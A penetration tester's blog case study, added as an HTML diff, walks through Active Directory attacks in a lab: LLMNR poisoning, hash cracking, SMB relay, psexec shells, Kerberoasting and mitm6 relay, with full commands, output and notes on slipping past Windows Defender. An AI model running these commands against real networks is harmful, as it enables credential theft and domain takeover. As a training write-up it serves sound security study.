@@ -1,0 +1,423 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Case Studies - Active Directory Initial Attack Vectors // FMisi&#39;s security.log</title>
+    <link rel="shortcut icon" href="../favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.105.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="FMisi" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="../../stiluslapom.css" />
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Notes - Information Gathering"/>
+<meta name="twitter:description" content="Port scanning using nmap Use -vvv for nmap scan to increase verbosity # TCP Scan # TARGET=&lt;TARGET&gt; &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap # Vulnerability Scan # nmap -n -sV --script vuln &lt;TARGET&gt; -Pn -vvv # UDP scan # nmap -p- --min-rate=1000 -T4 &lt;TARGET&gt; -Pn -sU -vvv # Output in all formats # nmap -p- -sC -sV -oA tcp_all_ports &lt;TARGET&gt; Specific purpose scanning FTP bruteforce # nmap # nmap --script ftp-brute -p 21 &lt;TARGET&gt; -Pn # hydra # hydra -C /usr/share/wordlists/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist."/>
+
+    <meta property="og:title" content="Notes - Information Gathering" />
+<meta property="og:description" content="Port scanning using nmap Use -vvv for nmap scan to increase verbosity # TCP Scan # TARGET=&lt;TARGET&gt; &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap # Vulnerability Scan # nmap -n -sV --script vuln &lt;TARGET&gt; -Pn -vvv # UDP scan # nmap -p- --min-rate=1000 -T4 &lt;TARGET&gt; -Pn -sU -vvv # Output in all formats # nmap -p- -sC -sV -oA tcp_all_ports &lt;TARGET&gt; Specific purpose scanning FTP bruteforce # nmap # nmap --script ftp-brute -p 21 &lt;TARGET&gt; -Pn # hydra # hydra -C /usr/share/wordlists/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://fmisi.github.io/notes/0-info-gathering/" /><meta property="article:section" content="notes" />
+<meta property="article:published_time" content="2022-07-13T23:18:05+13:00" />
+<meta property="article:modified_time" content="2022-07-13T23:18:05+13:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://fmisi.github.io/"><img class="app-header-avatar" src="../../avatar.jpg" alt="FMisi" /></a>
+      <span class="app-header-title">FMisi</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="../../index.html">/root</a>
+             - 
+          
+          <a class="app-header-menu-item" href="../../htb/index.html">/htb</a>
+             - 
+          
+		  <a class="app-header-menu-item" href="../../case-studies/index.html">/case-studies</a>
+             - 
+		  
+          <a class="app-header-menu-item" href="../../notes/index.html">/notes</a>
+      </nav>
+      <p>FMisi is a professional penetration tester.</p></br>
+      <a style="font-size: smaller;" href="../../../privacy/index.html">Privacy Policy</a></br>
+    </header>
+    <main class="app-container">
+
+  <article class="post">
+    <header class="post-header">
+      <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="fmisi" data-description="Support me on Buy me a coffee!" data-message="" data-color="#40DCA5" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+      <script src="/js/crypto-js.min.js"></script>
+      <script src="/js/dice.js"></script>
+      <h1 class ="post-title">Case Studies - Active Directory Initial Attack Vectors</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Apr 06, 2023
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          50 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+<h3 id="intro">Intro</h3>
+Active Directory is a directory service developed by Microsoft that is used to store information about network resources such as computers, users, groups, printers, and other network objects.</br>It provides a centralized and secure way to manage and authenticate users and computers on a Windows-based network.</br></br>This entry will refer to Active Directory as "AD".</br></br>Why study AD?</br>95% of the Fortune 1000 companies use AD and the AD is exploitable without patchable exploits.</br>We will utilize opportunities, trusts, components, etc.</br>
+<h3 id="intro">Phisical AD Components</h3>
+A <b>domain controller</b> is a server deployed with the AD DS role, which has been promoted to domain controller. (DS = Domain Services)</br></br>
+The Domain Controllers:
+<ul>
+<li>Store copy of the AD DS Data Storage</li>
+<li>Serve authentication and authorization services</li>
+<li>Replicate updates in the domain and forest for other domain controllers</li>
+<li>Grants Administrator access for managing user accounts and network resources</li>
+</ul>
+The <b>AD DS Data Storage</b> stores database files and processes which contain library information and manage services for users and applications.</br></br>
+The AD DS Data Storage:
+<ul>
+  <li>Contains the Ntds.dit file ( you want to get it: it contains all the users, objects, groups, and password hashes )
+    <ul>
+      <li>It is located at the "%SystemRoot%\NTDS" directory on all domain controllers by default</li>
+      <li>It is only accessable via the domain controller's processes and protocols</li>
+    </ul>
+  </li>
+</ul>
+<h3 id="intro">Logical AD Components</h3>
+The <b>AD DS Schema</b>
+<ul>
+<li>Defines every type of objects which can be stored in the library</li>
+<li>Enforces rules about the creation and configuration of objects</li>
+</ul>
+A schema is like a rule book in which rules are defined and those rules must be followed.</br></br>
+<table>
+<tr>
+<td>Object Types</td>
+<td>Function</td>
+<td>Example</td>
+</tr>
+<tr>
+<td>Class Object</td>
+<td>What kind of objects can be created in the library</td>
+<td>- User</br>- Computer</td>
+</tr>
+<tr>
+<td>Attribute Object</td>
+<td>What kind of objects can be created in the library</td>
+<td>- User</br>- Computer</td>
+</tr>
+</table></br>
+We use <b>domains</b> to group and manage objects in an organization.</br></br>
+Domains:
+<ul>
+<li>An admisitrative border for applying rules on objects' groups</li>
+<li>A replication border for replication of datas between domain controllers</li>
+<li>An authentication and authorization border that grants opportunity for restiction of resources</li>
+</ul>
+</br>
+<b>Trees</b></br></br>
+A domain <b>tree</b> is a domain hierarchy in the AD DS.</br></br>
+emea.con.com &lt;--- con.com ---&gt; na.con.com</br></br>
+Every domain in the tree:</br>
+<ul>
+<li>Shares coherent namespace with the parent domain</li>
+<li>Can have child domains</li>
+<li>Creats two-sided trust with other domains by default</li>
+</ul>
+</br>
+<b>Forests</b></br></br>
+The <b>forest</b> is a collection of one or more domain tree.</br></br>
+Forests:</br>
+<ul>
+<li>Share on common scheme</li>
+<li>Share on common configuration partition</li>
+<li>Share on common global catalog for turning on search</li>
+<li>Turn on trusts among every domain in the forest</li>
+<li>Share on the Enterprise Admins and Schema Admins groups</li>
+</ul>
+</br>
+<b>Organizational Units (OUs)</b></br></br>
+The OUs are AD storages which can contain users, groups, computers, and other OUs.</br></br>
+OUs are used for:
+<ul>
+<li>Hierarchical and logical representation of organization</li>
+<li>Handling collections of objects consistently</li>
+<li>Delegating privileges on admin object groups</li>
+<li>Applying rules</li>
+</ul>
+</br>
+<b>Trusts</b></br></br>
+The <b>trusts</b> grant mechanisms for users to access resources from another domain.</br></br>
+<table>
+<tr>
+<td>Trust type</td>
+<td>Description</td>
+</tr>
+<tr>
+<td>Directional</td>
+<td>The direction of the trust is going from the trusting domain to the trusted domain</td>
+</tr>
+<tr>
+<td>Transitive</td>
+<td>The trust connection is extended, so it can contain another trusted domains</td>
+</tr>
+</table></br>
+<br>
+Directional trust:</br></br>
+<img src="directionaltrust.png" height="55%" width="60%" alt="Directional Trust">
+</br></br>
+Transitive trust:</br></br>
+<img src="transitivetrust.png" height="55%" width="60%" alt="Transitive Trust">
+</br></br>
+<ul>
+<li>Every domain in the forest trust every other domain in the forest</li>
+<li>The trusts can be extended on outside of forest too</li>
+</ul>
+</br>
+<b>Objects</b></br></br>
+Example:</br></br>
+<table>
+<tr>
+<td>Object</td>
+<td>Description</td>
+</tr>
+<tr>
+<td>User</td>
+<td>Grants access to the network for a user</td>
+</tr>
+</table></br>
+<h3 id="background">Background: Active Directory Lab Build</h3>
+Now that we discussed why study AD and the components of AD, let's discuss the lab build and what to know about this specific case.</br></br>
+Windows Defender is turned off...<b>but it will be turned on intentionally before we are trying to achieve shell access</b>.</br></br>
+It is important to note that this case study does not cover advanced antivirus evasion and does not cover defense strategies neither.</br>
+They will be subject of another case studies.</br></br>
+Our Lab build looks like the following:</br></br>
+<img src="adlab.png" height="60%" width="65%" alt="*Lab Build*"></br></br>
+The user Frank Castle has a username which is "fcastle" and a password which is "Password1".</br>
+The domain name is MARVEL.Local.</br>
+On the HYDRA-DC, the AD DS is installed.</br>
+On the Win 10 Enterprise clients, the network discovery is turned on.</br>
+If we want to build the lab locally, we need 60 GB of space minimum and 16 GB of RAM minimum.
+</br></br>
+<table>
+<tr>
+<td>Name</td>
+<td>Type</td>
+<td>Description</td>
+</tr>
+<tr>
+<td>Administrator</td>
+<td>User</td>
+<td></td>
+</tr>
+<tr>
+<td>Frank Castle</td>
+<td>User</td>
+<td></td>
+</tr>
+<tr>
+<td>Guest</td>
+<td>User</td>
+<td></td>
+</tr>
+<tr>
+<td>Peter Parker</td>
+<td>User</td>
+<td></td>
+</tr>
+<tr>
+<td>SQL Service</td>
+<td>User</td>
+<td></td>
+</tr>
+<tr>
+<td>Tony Spark</td>
+<td>User</td>
+<td></td>
+</tr>
+</table></br></br>
+You can download the ISO files that are used in this lab build by typing "Microsoft Evaluation Center" on Google and clicking on the first result.</br></br>
+This AD environment is vulnerable to everything which will be presented in this case study.</br></br>
+<h3 id="intro">AD Attacks: Initial Attack Vectors</h3>
+<b>TOP 5 Roads for Compromising Domain Admin</b>
+<ol>
+<li>NetBIOS and LLMNR name poisoning</li>
+<li>Relay attacks</li>
+<li>MS17-010 (EternalBlue) / CVE-2020-1472 (ZeroLogon)</li>
+<li>Kerberoasting</li>
+<li>mitm6</li>
+</ol>
+<h4 id="LLMNR Poisoning">LLMNR Poisoning</h4>
+What is LLMNR?</br>
+- It is used to identify hosts if identifying with DNS is not successful</br>
+- Earlier: NBT-NS (NetBIOS-Name Service)</br>
+- Link Local Multicast Name Resolution</br>
+- Key's Error:</br></br>
+<img src="llmnrkeyerror.png" height="65%" width="65%" alt="*LLMNR Key Error*"></br></br>
+<ol>
+<li>Run Responder (should be running before port scanning)</li>
+<li>An Event Occurs. The victim is pointed to our Kali mahcine but it doesn't always have to be true</br></br><img src="event.png" height="65%" width="65%" alt="*event*"></br></br></li>
+<li>Get the Hash</li>
+<li>Crack the Hash</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># responder -I eth0 -rdwv</span>
+</span></span><span style="display:flex;"><span>[...]</br>[+] Poisoners:</br>    LLMNR [ON]</br>    NBT_NS [ON]</br>    DNS/MDNS [ON]</br>[...] SMB Server [ON]</br>[+] Generic Options:</br>    [...]</br>    Responder IP [192.168.57.139]</br>    [...]</br>[+] Listening for events...</span>
+</code></div>
+Windows:</br></br>
+<img src="windowsresponderipenter.png" height="65%" width="65%" alt="*Entering Responder IP on Windows then hitting Enter*"></br>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span>[+] Listening for events...</span>
+</span></span><span style="display:flex;"><span>[SMB] NTLMv2-SSP Hash: fcastle::MARVEL:[...]</span>
+</code></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># hashcat --help | grep NTLM</br>5500 | NetNTLMv1</br>5500 | NetNTLMv1+ESS</br>5600 | NetNTLMv2</br>1000 | NTLM</span>
+</code></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># gedit ntlmhash.txt</span>
+</code></div>
+*copy-paste the "fcastle::MARVEL:[...]" stuff*
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># hashcat -m 5600 ntlmhash.txt rockyou.txt --force</span>
+</code></div>
+It is important to note that we ought to run hashcat on our base OS.</br>
+Windows:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span><span>&gt; hashcat64.exe -m 5600 ntlmhash.txt rockyou.txt -O</span>
+</code></div>
+We got the password of fcastle which is Password1.</br>
+We successfully executed an LLMNR poisoning.</br>
+<h4 id="SMB Relay">SMB Relay</h4>
+What is SMB Relay?</br>
+- Instead of cracking hashes that we gathered with Responder, we can forward the hashes to given machines and gain access.</br>
+  This forwarding is the SMB Relay.</br></br>
+Requirements</br>
+- SMB signing must be disabled on the target OR enabled but not required</br>
+- The forwarded credentials must be Administrator credentials on the target machine.</br></br>
+<h5>Enumerating IP addresses of computers where SMB signing is turned off/turned on but not required for hashes</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># nmap --script=smb2-security-mode.nse -p445 192.168.57.0/24</br>[...]</br>Nmap scan report for 192.168.57.140</br>[...]</br>    Message signing enabled and required</br>[...]</br>Nmap scan report for 192.168.57.141</br>[...]</br>    Message signing is enabled but not required</br>[...]</br>Nmap scan for 192.168.57.142</br>[...]</br>    Message signing enabled but not required</span>
+</code></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># gedit targets.txt</span>
+</code></div>
+We write 192.168.57.142 inside the txt file. We must put in every machine's IP address where SMB signing is for some reason not required, but for now it is good to have only one for demonstration purpose.</br>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># gedit /etc/responder/Responder.conf</span>
+</code></div>
+Here we turn off the SMB- and the HTTP Server (SMB = OFF, HTTP = OFF).
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># responder -I eth0 -rdwv</br>[...]</br>HTTP Server [OFF]</br>[...]</br>SMB Server [OFF]</span>
+</code></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># ntlmrelayx.py -tf targets.txt -smb2support</br>[...]</br>[*] Servers started, waiting for connections</span>
+</code></div>
+We type in the file explorer on the victim's Windows PC: \\192.168.57.139</br>
+then press Enter.</br></br>
+<a href="https://www.youtube.com/watch?v=LycUI0mBWiw">Going back to Kali:</a></br></br>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span>[...]</br>[*] Dumping local SAM hashes ([...])</br>Administaror[...]</br>Guest[...]</br>DefaultAccount[...]</br>WDAGUtilityAccount[...]</br>Peter Parker[...]</br>[*] Done dumping SAM hashes for host: 192.168.57.142</br>[...]</span>
+</code></div>
+OR
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># ntlmrelayx.py -tf targets.txt -smb2support -i</span>
+</code></div>
+We type in the file explorer on the victim's Windows PC: \\192.168.57.139</br>
+then press Enter.</br>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span>[...]</br>Started interactive SMB client shell via TCP on 127.0.0.1:11000</br>[...]</span>
+</code></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span>[...]</br># nc 127.0.0.1 11000</br>[...]</br># help</br># shares</br>ADMIN$</br>C$</br>TPC$</br>Share</br># use C$</br># ls</br>* Contents of the C drive. We can delete, add, or download! *</br># use ADMIN$</br># ls</br>* Admin's C drive's contents :D We can delete, add, or download! *</span>
+</code></div>
+We can utilize other commands for exploiting SMB Relay. Examples:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span>[...]</br># ntlmrelayx.py -tf targets.txt -smb2support -e test.exe</br>OR</br># ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"</span>
+</code></div>
+<h4 id="ashella">Achieving Shell Access</h4>
+Before moving on, let's see an example on how we can achieve shell access.</br>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># msfconsole</br><u>msf5</u>&gt; search psexec</br>[...]</br>10 exploit/windows/smb/psexec</br><u>msf5</u>&gt; use 10</br>        &gt; options</br>        [...]</br>        &gt; set rhost 192.168.57.141</br>        &gt; set smbdomain marvel.local</br>        > set smbpass Password1</br>        &gt; set smbuser fcastle</br>        &gt; options</br>        &gt; set lhost eth0</br></br>        &gt; run</br>* It is important to note that running this exploit does <b>not</b> work always for the first try and</br>that setting the target option could be useful *</br></br>        &gt; show targets</br>        [...]</br>        2 Native upload</br></br>        &gt; set target 2</br></br>        &gt; run</br>        [...]</br>        STATUS_VIRUS_DETECTED</br></br>        &gt;</span>
+</code></div>
+Unfortunately, Windows Defender turned on automatically because of the exploit and catched our reverse shell.</br>
+All this effort with Metasploit was useless in this case as we could not gain access to the target machine with a reverse shell, no matter how many times we try.</br> 
+We can try psexec.py instead.</br>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># psexec.py marvel.local/fcastle:Password1@192.168.57.141</br>[...]</br>C:\Windows\system32&gt; </span>
+</code></div>
+Excellent! Windows Defender did not notice our attempt and we achieved shell access.</br>
+If psexec.py fails, we can try smbexec.py and/or wmiexec.py with the exact same parameters.</br>
+In this case, both smbexec.py and wmiexec.py failed because Windows Defender cached them.</br>
+It is important to note that these exploits do not work for the first time always, it is important to retry several times to evaluate this part of the Active Directory environment.</br>
+<h4 id="eternalblue">MS17-010 (EternalBlue) / CVE-2020-1472 (ZeroLogon)</h4>
+These are way too easy to exploit to cover in more depth.</br>
+Refer to the Useful References section for more information.</br>
+<h4 id="kerberoasting">Kerberoasting</h4>
+Kerberoasting is an attack that utilizes a feature of Windows called Kerberos.</br>
+The goal of Kerberoasting is to get the TGS secret key and crack the server account's hash.</br>
+Test for Kerberoasting only if you have/can guess the domain name and a valid username.</br></br>
+<img src="kerberoasting.png" height="60%" width="60%" alt="* Picture of Kerberos auth*"></br>
+<ol>
+<li>Requesting TGT, giving NTLM hash</li>
+<li>Receiving TGT, encrypted with krbtgt hash</li>
+<li>Requesting TGS for Application Server (shows up TGT)</li>
+<li>Receiving TGS, encrypted with the server account's hash</li>
+<li>Showing up encrypted TGS</li>
+<li>Answer, if manual authentication is required</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># GetUserSPNs.py marvel.local/fcastle</br>[...]</br>$krb5tgs[...]ee</span>
+</code></div>
+We put the hash in a file named - let's say - hashes.txt.</br>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># hashcat -m 13100 hashes.txt rockyou.txt</br>[...]</br>$krb5tgs[...]ee:<b><u>Password1</u></b></br>[...]</br>#</span>
+</code></div>
+Very easy.
+<h4 id="ipv6att">IPv6 Attacks Overview</h4>
+If we use Ipv4 but the IPv6 is enabled, who serves DNS for IPv6?</br>
+Usually nobody ===> we can set up a false DNS server to compromise the domain controller by stealing an admin's credentials with the false DNS server if the admin logs in to a client!</br>
+In this case, the false DNS server and the domain controller has IPv4 addresses from the same subdomain.</br>
+The false IPv6 DNS server serves DNS along with LDAP and SMB.</br>
+In turn, the domain controller would provide the NTLM hash, but we do not crack the hash in this case as we would achieve LDAP Relay.</br>
+This means that if the admin logs in then we can stop the relay in a way that we can read the admin credentials.</br>
+We use the tool mitm6 for this purpose.</br></br>
+Downloading mitm6:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span>cd /opt/</br>git clone https://github.com/fox-it/mitm6.git</br>cd /mitm6/</br>ls</br>pip3 install .</span>
+</code></div>
+We need LDAPS on the DC in order to exploit this IPv6 condition.</br>
+Let's assume there is no LDAPS on the DC but we can install the LDAPS service.</br>
+It will most likely never be the case but it is a good practise.</br>
+Clicking on the flag icon through our remote desktop we see a text which is "Select server rules".</br>
+There we put a tick next to "Active Directory Certificate Services".</br>
+After that, we put a tick next to Certification Authority.</br>
+Then we select "Restart [...] if required".</br>
+We click on the flag icon which noew has an exlamation mark in a triangle next to it.</br>
+We put a tick next to "Certification Authority" and set the expiration to 99 years.</br>
+99 years will be enough time for our attack.</br>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># mitm6 -d marvel.local</br>#ntlmrelayx.py -6 -t https://192.168.57.140 -wh fakepad.marvel.local -l l00tme</br>* achieve a restart on the Windows client *</br>* Admin logs in on the Windows 10 client *</br> * Ctrl-C *</br>[...]</br>username: NfSGuFeMXl and password: 5?AL93N;7lQ*()f</br>result: OK [...]</span>
+</code></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># ls</br>[...] lootme [...]</br># cd l00tme/</br>ls</br>* loots *</br># firefox domain_users_by_group.html</br>* we can see the users and their informations *</span>
+</code></div>
+Any ACL attack using ntlmrelayx saves a restore file that can be provided to aclpwn.py to restore the original permissions on the domain object.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># python aclpwn.py --restore ../aclpwn-20190319-125741.restore</span>
+</code></div>
+<h4 id="miscatt">Misc Vectors and Strategies</h4>
+<pre>
+- Start the day with mitm6 or Responder. mitm6 is a bit faster.
+- Run scans to generate traffic.
+- If the scans take too long, search for websites in scope.
+  You can do this with the http_version Metasploit module. (silent)
+- Search for default credentials on website logins
+    - Printers
+	- Jenkins
+	- Etc.
+- Think outside the box
+- Try harder
+</pre>
+That's pretty much it. Very easy.</br>
+</br></br>
+~Thank you for reading~
+<h3 id="useful-references">Useful references</h3>
+<ul>
+<li>adsecurity.org: <a href="adsecurity.org">adsecurity.org</a></li>
+<li>blog.harmj0y.net: <a href="blog.harmj0y.net">blog.harmj0y.net</a></li>
+<li>www.pentestacademy.com/activedirectorylab and /redteamlab:</br><a href="www.pentestacademy.com/activedirectorylab">www.pentestacademy.com/activedirectorylab</a> and <a href="www.pentestacademy.com/redteamlab">www.pentestacademy.com/redteamlab</a></li>
+<li>elearnsecurity.com: <a href="elearnsecurity.com">elearnsecurity.com</a></li>
+<li>An EternalBlue Checker and Exploit: <a href="https://github.com/totekuh/eternalblue">https://github.com/totekuh/eternalblue</a></li>
+<li>A Zerologon Checker and Exploit: <a href="https://github.com/VoidSec/CVE-2020-1472/tree/aaf4497354ed633b3cb8dc14c7c085103fdb3719">https://github.com/VoidSec/CVE-2020-1472/tree/aaf4497354ed633b3cb8dc14c7c085103fdb3719</a></li>
+<li>More Information About IPv6 Attacks: <a href="https://janm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-authentication">https://janm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-authentication</a></li>
+</ul>
+	<div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
